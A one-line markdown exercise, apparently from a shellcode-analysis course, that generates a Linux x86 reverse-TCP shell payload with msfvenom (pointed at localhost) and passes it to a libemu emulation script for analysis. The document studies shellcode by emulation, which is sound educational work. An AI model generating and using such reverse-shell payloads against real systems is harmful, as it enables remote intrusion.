# Exercise 1


```
sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" bindshell | tee libemu_res/libemu_res.txt
```
